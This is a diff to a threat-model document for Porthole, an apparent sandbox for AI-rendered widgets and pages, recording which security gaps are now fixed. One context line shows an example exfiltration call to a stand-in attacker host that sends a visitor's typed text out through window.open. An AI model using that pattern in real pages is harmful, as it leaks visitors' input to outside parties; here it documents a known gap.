@@ -5,10 +5,10 @@ What Porthole protects, from whom, and where that protection ends. For each way 
 guaranteed. [ADOPTING.md](ADOPTING.md) says how to set each one up, and
 [DESIGN.md](DESIGN.md) lists every defense with the test that proves it.
 
-**Status.** This describes `main` as of 2026-10-19 (0.7.0, with P093 and P097). A review that day
-found gaps, and their fixes are planned or in review. A note **open until P0xx** means the gap
-exists on `main` today and decision P0xx is its planned fix; once that fix merges, the note
-becomes a guarantee. [§8](#8-fixes-in-flight) lists the decisions.
+**Status.** This describes `main` as of 2026-10-19 (0.7.0, with P092, P093, P094 and P097). A review
+that day found gaps; some of their fixes have merged, and the rest are planned. A note **open until
+P0xx** means the gap exists on `main` today and decision P0xx is its planned fix; once that fix
+merges, the note becomes a guarantee. [§8](#8-fixes-in-flight) lists the decisions.
 
 ## 1. Two layers
 
@@ -71,8 +71,8 @@ the agent, but it is not a wall.
 
 The app runtime adds a third: **the host's API is the wall for its data.** The bridge refuses a
 call the page didn't declare (`undeclared`), or that the viewer's level doesn't allow, before any
-handler runs. (Without a viewer, the names a page declares in `data` aren't held yet: open until
-P094.) The host's API checks again, since a call that reaches the API some other way can claim any
+handler runs. The names a page declares in `data` hold with a viewer and without one (P094). The
+host's API checks again, since a call that reaches the API some other way can claim any
 viewer and any declaration.
 
 The leak suite attempts each channel in DESIGN.md's table from inside the content, on Chromium,
@@ -91,8 +91,9 @@ Porthole does not protect against these.
   opaque frame may share the host page's process (the browser decides), so a loop in it can stall
   the host's tab; a served frame is on another site, which browsers with site isolation put in a
   process of its own. In scope, by contrast: a page or a request that can crash the host's server,
-  and a message from content that makes the host's page do unbounded work (SECURITY.md). The known
-  cases are being fixed (open until P092 and P095).
+  and a message from content that makes the host's page do unbounded work (SECURITY.md). On Node,
+  no request ends the process, and the issue endpoint reads at most 64 KiB of a body (P092);
+  content's messages that are read whole before their gate are open until P095.
 - **Browser bugs, and what the leak suite doesn't run on.** The walls are the browser's own (the
   sandbox, CSP, same-origin policy, site isolation): a bug in them is outside Porthole. The suite
   runs Chromium, WebKit and Firefox through Playwright; other engines, versions and embedded
@@ -119,7 +120,7 @@ Porthole does not protect against these.
 | [S1](#s1-inline-widgets-in-a-conversation) | Inline widgets in a conversation | `inlineWidget`, opaque | (a) | every page sends `embedderCsp` |
 | [S2](#s2-live-widgets-content-that-reads-the-hosts-data) | Live widgets that read the host's data | `liveWidget` | (a), (e) | as S1, and the page follows S7 |
 | [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a), (c) | the content domain is the host's alone, the secret is random, `authorize` revokes |
-| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | P099 and P094 have merged, and the host handles abuse |
+| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | P099 has merged, and the host handles abuse |
 | [S5](#s5-third-party-mcp-apps) | Third-party MCP Apps | `mcpApp` | (b) | the host shows a view's domains and its model context |
 | [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d), (c) | the code is the host's own |
 | [S7](#s7-several-displays-on-one-page) | Several displays on one page | any | (e) | the page follows the composition rule |
@@ -222,6 +223,8 @@ them):
   (asked once per display; without a consent function every data call is refused) and a rate (120
   reads and 60 subscriptions a minute).
 - A refusal tells the widget why (`data: { code, message }`).
+- A result the host pushes with `changed(result)` answers a later read only past `readData`'s own
+  gates, as any read does (P094).
 - Served, the shell cancels any navigation of the frame to another document, other than a page of
   its own file set, and tells the host (`navigationBlocked`, where `reportError` is declared).
 
@@ -241,9 +244,6 @@ them):
 **Not guaranteed**
 
 - What a neighbouring frame does with data handed to it (S7).
-- A result the host pushes with `changed(result)` answers the next read without `readData`'s own
-  gates, having passed only `subscribeData`'s (open until P094). With the preset's defaults both
-  have the same consent; it matters where `readData` is made stricter.
 - In an engine without the Navigation API, a served frame's navigation falls back to the page's
   `frame-src`: outside sites stay shut, other content origins don't (P079).
 - `LIBRARY_CDNS` displays are allowed on the same page (ADOPTING.md), but they reach nine
@@ -327,7 +327,7 @@ the attacker (c), and its readers are strangers.
 - A public grant opens documents, never url-mode apps.
 - A public grant without a `level` has no viewer. Under a runtime, such a page is refused the
   runtime's own host functions (`user`, `comments`, `artifact`, `assets`, `db`) and every method
-  above `view`.
+  above `view`; with a declaration, it reads only the `data` names it declared (P094).
 - The page is on a site that isn't the host's (its sibling labels share one until the content
   domain is on the PSL, S3); a label is one DNS label, never of the form IDNA reserves (`xn--`),
   so it is never punycode for another name; pages say `noindex`; a file of a type Porthole
@@ -342,10 +342,11 @@ the attacker (c), and its readers are strangers.
   carry any level, up to `owner`, and a `user`, and then the page has a viewer at that level.
 - On pages shared with signed-in people, not offer `db` writes and `user`, or gate them with
   `consent` or `confirm` (their defaults are rates only: 600 and 60 a minute).
-- Rate-limit the issue endpoint (`rateLimit`: optional, per process) by a key it trusts
-  (`rateLimit.key`). By default an anonymous request is keyed on `CF-Connecting-IP`, else
-  `X-Forwarded-For`, which a client sets unless an edge in front replaces them (open until
-  P092).
+- Rate-limit the issue endpoint (`rateLimit`: optional, per process). An anonymous request is
+  keyed by an address the client can't set (P092): the socket's peer on Node, `CF-Connecting-IP`
+  on Workers. Behind proxies, say how many append to `X-Forwarded-For`
+  (`rateLimit.trustedProxies`) or key it yourself (`rateLimit.key`); otherwise every anonymous
+  request through a proxy shares that proxy's limit.
 - Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
 
 **Not guaranteed**
@@ -354,8 +355,6 @@ the attacker (c), and its readers are strangers.
   but a click can run `window.open("https://attacker.example/?" + whatTheVisitorTyped)`, past
   `connect-src` and `form-action` (open until P099). In a frame the sandbox has no
   `allow-popups`, so this is about tabs, which is how public links are usually opened.
-- Without a viewer, a runtime page's declared `data` names aren't held: it can read and follow
-  any resource the host's handlers serve (open until P094).
 - `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
   `{ id, name, level }`, the page can read and keep in `db`. Closed egress doesn't cover a channel
   the host itself provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what
@@ -494,8 +493,8 @@ section.
 **Porthole guarantees**, in the bridge, before any handler runs:
 
 - A page reaches the built-ins its kind offers (`clipboard`, `links`, `downloads`, `comments`) and
-  what it declared when published; anything else is refused (`undeclared`). Without a viewer, the
-  names it declares in `data` aren't held yet (open until P094). A page from before 0.7 (the
+  what it declared when published; anything else is refused (`undeclared`). The names it declares
+  in `data` hold with a viewer and without one (P094). A page from before 0.7 (the
   host's `null` declaration) keeps 0.6's surface and gets none of `user`, `artifact`, `assets` and
   `db`.
 - Each method has a least level (`view < interact < admin < owner`), held against the viewer's
@@ -507,6 +506,9 @@ section.
   the viewer, and paths in answers say `data/users/me`, never that id.
 - What changes the artifact for everyone needs, by default, a gesture and a confirmation:
   `artifact.publish` and `assets.delete` (a host's `methodGates` for them replace these).
+- A `db.batch` runs under the gates of each of its writes, and a `db.watch` under those of `get`
+  or `query`, as well as their own; a batch that needs a confirmation is confirmed once, whole
+  (P094).
 - Except in **bearer mode** (`AssetStore.bearer`, an opt-in that serves an asset to anyone with
   its id), assets are served only to an access for their own artifact, after the host's check. A
   code-typed asset runs as code only when an admin uploaded it where uploaded code may run;
@@ -526,8 +528,6 @@ section.
 - Revoke with its per-request check (`authorize`) and `content.forget(…)`.
 - Keep each person's data apart in its own stores, and refuse moved bases and versions
   (`Refused("conflict")`).
-- Set the same `methodGates` on `db.batch` and `db.watch` as on the methods they run: a batch and
-  a watch take their inner methods' levels but not their gates (open until P094).
 - Handle abuse on shared pages (S4).
 
 **Not guaranteed**
@@ -546,9 +546,9 @@ its row names exists today, and the sections it cites say "open until" that deci
 
 | Decision | State | What it closes | Sections |
 | --- | --- | --- | --- |
-| P092 | Planned | A request with a method `fetch` refuses (`TRACE`) can end a Node process through the Node adapter; the issue endpoint reads a JSON body without a byte limit, before the host's `access`; its rate limit keys anonymous requests, by default, on headers a client sets. | §5, S4 |
+| P092 | Merged | A request with a method `fetch` refuses (`TRACE`) could end a Node process through the Node adapter; the issue endpoint read a JSON body without a byte limit; its rate limit keyed anonymous requests on headers a client sets. Now no request ends the process, a body is read to 64 KiB at most, and the key is an address the client can't set. | §5, S4 |
 | P093 | Merged | `intersectDeclarations` compared rules name by name, so a current wildcard didn't narrow a version's named rule, and a collection named `__proto__` was lost. Now the result allows exactly what both sides allow. | §7 |
-| P094 | Planned | Without a viewer, a page's declared `data` names aren't held; a pushed result answers a read past `readData`'s gates; `db.batch` and `db.watch` skip their inner methods' `methodGates`. | §4, S2, S4, §7 |
+| P094 | Merged | Without a viewer, a page's declared `data` names weren't held; a pushed result answered a read past `readData`'s gates; `db.batch` and `db.watch` skipped their inner methods' `methodGates`. Now each holds. | §4, S2, S4, §7 |
 | P095 | Planned | What content sends is read before its gate: a log or error report is serialized whole first; waiting confirmations have no cap. | §5, S5 |
 | P096 | Planned | The negative-control runner counts a control that didn't run as passed, and CI runs the runtime's controls only. | §4 |
 | P097 | Merged | A release waits for the same commit's CI. No guarantee here depends on it. | |
